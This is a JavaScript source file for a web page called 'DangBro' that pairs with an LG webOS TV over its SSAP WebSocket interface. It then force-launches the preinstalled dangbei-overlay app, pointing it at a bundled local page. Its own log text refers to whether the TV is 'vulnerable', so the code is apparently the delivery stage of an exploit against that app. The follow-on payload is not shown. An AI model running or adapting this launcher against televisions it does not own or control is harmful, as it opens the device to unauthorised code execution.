const $ = (id) => document.getElementById(id);

const logEl = $('log');
const statusDot = $('statusDot');
const statusText = $('statusText');
const tvIpEl = $('tvIp');
const connectBtn = $('connectBtn');

const CONNECT_TIMEOUT_MS = 7000;
const CERT_HELP_URL = 'https://help.motorolanetwork.com/kb/general/troubleshooting-connection-isn-t-private-message';
const CLIENT_KEY_PREFIX = 'webos-ssap-client-key:';
const debugMode = new URLSearchParams(window.location.search).has('debug');
const targetUrl = new URL('./resources/dangbro/' + (debugMode ? '?debug' : ''), window.location.href).toString();

const state = {
  attempt: 0,
  pending: false,
  waitingForPairing: false,
  hadStoredClientKey: false,
  connectStartedAt: 0,
  launchStarted: false
};

function log(kind, data) {
  const text = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
  logEl.textContent += `[${kind}] ${text}\n\n`;
  logEl.scrollTop = logEl.scrollHeight;
}

function debugLog(kind, data) {
  if (!debugMode) return;
  log(kind, data);
}

function setStatus(type, text) {
  statusDot.className = 'dot ' + (type || '');
  statusText.textContent = text;
}

function openModal(options) {
  $('modalTitle').textContent = options.title;
  $('modalBody').textContent = options.body;
  $('modalPrimaryBtn').textContent = options.primaryLabel || 'retry';
  $('modalSecondaryBtn').textContent = options.secondaryLabel || 'open cert';
  $('modalHelpBtn').textContent = options.helpLabel || 'browser guide';
  $('modalDismissBtn').textContent = options.dismissLabel || 'close';
  $('modalSecondaryBtn').hidden = Boolean(options.hideSecondary);
  $('modalHelpBtn').hidden = Boolean(options.hideHelp);
  $('modalDismissBtn').hidden = Boolean(options.hideDismiss);
  $('modal').hidden = false;
  $('modalPrimaryBtn').onclick = () => options.onPrimary && options.onPrimary();
  $('modalSecondaryBtn').onclick = () => options.onSecondary && options.onSecondary();
  $('modalHelpBtn').onclick = () => options.onHelp && options.onHelp();
  $('modalDismissBtn').onclick = () => {
    if (options.onDismiss) options.onDismiss();
    $('modal').hidden = true;
  };
}

function hideModal() {
  $('modal').hidden = true;
}

function showPairingDialog() {
  openModal({
    title: 'Approve Pairing On TV',
    body: 'The TV is asking for confirmation. Accept the pairing prompt on the TV, then this page should continue automatically.',
    primaryLabel: 'retry connect',
    dismissLabel: 'keep waiting',
    hideSecondary: true,
    hideHelp: true,
    onPrimary: () => startConnect(),
    onDismiss: () => {}
  });
}

function createWsProxy() {
  return new Promise((resolve, reject) => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(`<!doctype html><html><body><script>
      let ws = null;
      let parentOrigin = '*';
      function send(type, payload) { parent.postMessage({ __ssapProxy: true, type, payload }, parentOrigin); }
      window.addEventListener('message', (event) => {
        const msg = event.data;
        if (!msg || !msg.__ssapBridgeCmd) return;
        parentOrigin = event.origin || '*';
        if (msg.type === 'connect') {
          try {
            if (ws) { try { ws.close(); } catch (_) {} }
            ws = new WebSocket(msg.url);
            ws.onopen = () => send('open', {});
            ws.onclose = (ev) => send('close', { code: ev.code, reason: ev.reason, wasClean: ev.wasClean });
            ws.onerror = () => send('error', { message: 'WebSocket error' });
            ws.onmessage = (ev) => send('message', { data: ev.data });
          } catch (err) {
            send('error', { message: err.message || String(err) });
          }
        }
        if (msg.type === 'send') {
          try {
            if (!ws || ws.readyState !== WebSocket.OPEN) throw new Error('Socket not open');
            ws.send(msg.data);
          } catch (err) {
            send('error', { message: err.message || String(err) });
          }
        }
        if (msg.type === 'close') {
          try { if (ws) ws.close(); } catch (err) { send('error', { message: err.message || String(err) }); }
        }
      });
    <\/script></body></html>`);
    iframe.onload = () => resolve({
      iframe,
      send(cmd) {
        iframe.contentWindow.postMessage({ __ssapBridgeCmd: true, ...cmd }, '*');
      }
    });
    iframe.onerror = () => reject(new Error('Failed to load proxy iframe'));
    document.body.appendChild(iframe);
  });
}

class WebOsSsapBridge extends EventTarget {
  constructor() {
    super();
    this.proxy = null;
    this.ip = '';
    this.port = '3001';
    this.reqId = 1;
    this.pending = new Map();
    this.connected = false;
    this.registered = false;
  }

  async ensureProxy() {
    if (this.proxy) return;
    this.proxy = await createWsProxy();
    window.addEventListener('message', (event) => {
      if (event.source !== this.proxy.iframe.contentWindow) return;
      const msg = event.data;
      if (!msg || !msg.__ssapProxy) return;
      if (msg.type === 'open') {
        this.connected = true;
        setStatus('warn', 'Connected, registering …');
        this.register();
        this.dispatchEvent(new CustomEvent('open'));
        return;
      }
      if (msg.type === 'close') {
        this.connected = false;
        this.registered = false;
        setStatus('', 'Disconnected');
        this.dispatchEvent(new CustomEvent('close', { detail: msg.payload || {} }));
        return;
      }
      if (msg.type === 'error') {
        setStatus('err', 'Connection failed');
        this.dispatchEvent(new CustomEvent('error', { detail: msg.payload || {} }));
        return;
      }
      if (msg.type !== 'message') return;

      let parsed;
      try {
        parsed = JSON.parse(msg.payload.data);
      } catch (_) {
        return;
      }

      this.dispatchEvent(new CustomEvent('ssap-message', { detail: parsed }));
      if (parsed.type === 'registered') {
        this.registered = true;
        setStatus('ok', 'Registered');
        const clientKey = parsed.payload && parsed.payload['client-key'];
        if (clientKey) localStorage.setItem(CLIENT_KEY_PREFIX + this.ip, clientKey);
      }
      if (parsed.id && this.pending.has(parsed.id)) {
        this.pending.get(parsed.id)(parsed);
        this.pending.delete(parsed.id);
      }
    });
  }

  async connect(ip) {
    this.ip = ip.trim();
    this.connected = false;
    this.registered = false;
    await this.ensureProxy();
    this.proxy.send({ type: 'connect', url: `wss://${this.ip}:${this.port}` });
  }

  disconnect() {
    if (this.proxy) this.proxy.send({ type: 'close' });
  }

  nextId(prefix) {
    return `${prefix}_${this.reqId++}`;
  }

  sendRaw(message) {
    if (!this.proxy) throw new Error('Proxy is not initialized');
    this.proxy.send({ type: 'send', data: JSON.stringify(message) });
  }

  register() {
    const clientKey = localStorage.getItem(CLIENT_KEY_PREFIX + this.ip) || '';
    const message = {
      id: this.nextId('register'),
      type: 'register',
      payload: {
        forcePairing: false,
        pairingType: 'PROMPT',
        manifest: {
          manifestVersion: 1,
          appVersion: '1.0',
          signed: {
            appId: 'com.example.ssap.dangbro',
            created: '2026-03-30',
            permissions: [
              'TEST_SECURE',
              'READ_INSTALLED_APPS',
              'READ_RUNNING_APPS',
              'READ_NOTIFICATIONS',
              'READ_NETWORK_STATE',
              'READ_POWER_STATE',
              'READ_COUNTRY_INFO',
              'WRITE_NOTIFICATION_TOAST'
            ],
            vendorId: 'com.example'
          },
          permissions: [
            'LAUNCH',
            'APP_TO_APP',
            'CLOSE',
            'TEST_OPEN',
            'TEST_PROTECTED',
            'READ_APP_STATUS',
            'READ_INSTALLED_APPS',
            'READ_NETWORK_STATE',
            'READ_RUNNING_APPS',
            'READ_POWER_STATE',
            'READ_COUNTRY_INFO',
            'WRITE_NOTIFICATION_TOAST'
          ],
          signatures: [{ signatureVersion: 1, signature: 'dangbro-local-demo' }]
        }
      }
    };
    if (clientKey) message.payload['client-key'] = clientKey;
    this.sendRaw(message);
  }

  request(uri, payload, timeoutMs = 15000) {
    if (!this.connected) throw new Error('Not connected');
    const id = this.nextId('call');
    this.sendRaw({ id, type: 'request', uri, payload });
    return new Promise((resolve) => {
      this.pending.set(id, resolve);
      setTimeout(() => {
        if (!this.pending.has(id)) return;
        this.pending.delete(id);
        resolve({ id, timeout: true });
      }, timeoutMs);
    });
  }
}

const bridge = new WebOsSsapBridge();
const BROADCAST_CONFIG_NAMES = ['tv.nyx.tvBroadcastSystem', 'tv.model.sysType'];

async function warnIfDangbeiOverlayMissing() {
  let response;
  try {
    response = await bridge.request('ssap://com.webos.applicationManager/listApps', {}, 5000);
  } catch (error) {
    log('warn', 'Could not verify whether dangbei-overlay is installed before launch.');
    debugLog('warn-detail', error instanceof Error ? error.message : String(error));
    return;
  }

  if (response.timeout) {
    log('warn', 'listApps timed out. Could not verify whether dangbei-overlay is installed.');
    return;
  }

  if (response.type === 'error') {
    log('warn', 'listApps was denied by SSAP (' + (response.error || 'unknown error') + '). The app-presence check is inconclusive.');
    return;
  }

  const apps = Array.isArray(response.payload?.apps) ? response.payload.apps : [];
  const hasDangbeiOverlay = apps.some((app) => app && app.id === 'com.webos.app.dangbei-overlay');
  if (!hasDangbeiOverlay) {
    log('warn', 'com.webos.app.dangbei-overlay was not found in listApps. If nothing happens on the TV it is likely not vulnerable.');
  } else {
    log('success', 'Confirmed existence of dangbei-overlay app.');
  }
}

async function launchDangbro() {
  if (state.launchStarted) return;
  state.launchStarted = true;

  const payload = {
    id: 'com.webos.app.dangbei-overlay',
    params: {
      source: 'ssap-dangbro',
      target: targetUrl
    }
  };

  debugLog('request', {
    uri: 'ssap://system.launcher/launch',
    payload
  });

  const response = await bridge.request('ssap://system.launcher/launch', payload);
  if (response.timeout) {
    state.launchStarted = false;
    throw new Error('Dangbro launch timed out');
  }

  debugLog('response', response.payload || response);
  setStatus('ok', 'Connected, launch sent');
}

bridge.addEventListener('open', () => {
  log('connect', `TV reached. Starting SSAP registration for ${bridge.ip}.`);
  if (!state.hadStoredClientKey) {
    state.waitingForPairing = true;
    setStatus('warn', 'Confirm pairing on TV');
    log('pair', 'Waiting for confirmation on the TV screen.');
    showPairingDialog();
    return;
  }

  debugLog('pair', 'Using stored client key. Waiting for registration result.');
});

bridge.addEventListener('error', () => {
  state.waitingForPairing = false;
  if (!state.pending) return;
  state.pending = false;
  state.launchStarted = false;
  const elapsedMs = state.connectStartedAt ? Date.now() - state.connectStartedAt : 0;
  const isLikelyCertificateBlocked = elapsedMs > 0 && elapsedMs < 1500;
  const title = isLikelyCertificateBlocked ? 'Certificate Likely Blocked' : 'Connection Failed';
  const body = elapsedMs > 0 && elapsedMs < 1500
    ? 'The WSS connection failed almost immediately. In practice this usually means the browser blocked the TV self-signed certificate. Open the TV certificate page first and allow the connection.'
    : 'The WSS connection failed before registration completed. This can be caused by a wrong TV IP, the TV being offline, port 3001 not being reachable, or general network/connectivity problems.';
  setStatus('err', 'Connection failed');
  log('error', body);
  openModal({
    title,
    body,
    primaryLabel: 'retry connect',
    secondaryLabel: 'open cert',
    dismissLabel: 'close',
    hideSecondary: state.hadStoredClientKey || !isLikelyCertificateBlocked,
    hideHelp: !isLikelyCertificateBlocked,
    onPrimary: () => startConnect(),
    onSecondary: () => {
      const ip = tvIpEl.value.trim();
      if (!ip) {
        log('error', 'Please enter a TV IP');
        return;
      }
      window.open(`https://${ip}:3001/`, '_blank', 'noopener,noreferrer');
    },
    onHelp: () => window.open(CERT_HELP_URL, '_blank', 'noopener,noreferrer')
  });
});

bridge.addEventListener('ssap-message', async (event) => {
  const msg = event.detail;

  if (msg.type === 'response' && msg.payload?.pairingType === 'PROMPT') {
    state.waitingForPairing = true;
    setStatus('warn', 'Confirm pairing on TV');
    log('pair', 'Pairing prompt detected. Please accept it on the TV.');
    showPairingDialog();
    return;
  }

  if (msg.type !== 'registered') return;

  state.pending = false;
  state.waitingForPairing = false;
  hideModal();
  log('connect', state.hadStoredClientKey
    ? 'Connected. Existing client key accepted.'
    : 'Connected. Pairing completed and the TV is ready.');
  await warnIfDangbeiOverlayMissing();
  log('launch', `Starting automatic dangbei-overlay launch to ${targetUrl}`);

  try {
    await launchDangbro();
  } catch (error) {
    state.launchStarted = false;
    setStatus('err', 'Launch failed');
    log('error', error instanceof Error ? error.message : String(error));
  }
});

async function startConnect() {
  const ip = tvIpEl.value.trim();
  if (!ip) {
    log('error', 'Please enter a TV IP.');
    return;
  }

  state.attempt += 1;
  state.pending = true;
  state.waitingForPairing = false;
  state.hadStoredClientKey = Boolean(localStorage.getItem(CLIENT_KEY_PREFIX + ip));
  state.connectStartedAt = Date.now();
  state.launchStarted = false;
  localStorage.setItem('webos-last-ip', ip);

  hideModal();
  bridge.disconnect();
  setStatus('warn', 'Connecting …');
  log('connect', `Trying to reach TV at ${ip} over wss:// on port 3001.`);

  const attempt = state.attempt;

  try {
    await bridge.connect(ip);
  } catch (error) {
    state.pending = false;
    setStatus('err', 'Connection failed');
    log('error', error instanceof Error ? error.message : String(error));
    return;
  }

  setTimeout(() => {
    if (attempt !== state.attempt) return;
    if (state.waitingForPairing || bridge.registered || !state.pending) return;
    state.pending = false;
    setStatus('err', 'Connection failed');
    log('error', 'TV did not answer in time. This usually points to a wrong IP or a general network reachability problem.');
    openModal({
      title: 'Connection Failed',
      body: 'No successful WSS connection was established in time. This usually means the TV IP is wrong, the TV is offline, or port 3001 is not reachable on the network.',
      primaryLabel: 'retry connect',
      dismissLabel: 'close',
      hideSecondary: true,
      hideHelp: true,
      onPrimary: () => startConnect()
    });
    bridge.disconnect();
  }, CONNECT_TIMEOUT_MS);
}

connectBtn.addEventListener('click', () => startConnect());
$('modalDismissBtn').addEventListener('click', () => hideModal());
tvIpEl.addEventListener('change', () => localStorage.setItem('webos-last-ip', tvIpEl.value.trim()));
tvIpEl.addEventListener('keyup', () => localStorage.setItem('webos-last-ip', tvIpEl.value.trim()));

(() => {
  const savedIp = localStorage.getItem('webos-last-ip') || '';
  if (savedIp) tvIpEl.value = savedIp;
  setStatus('', 'Idle');
  log('boot', 'DangBro page ready.' + (debugMode ? ' [debug mode — log upload enabled]' : ''));
})();
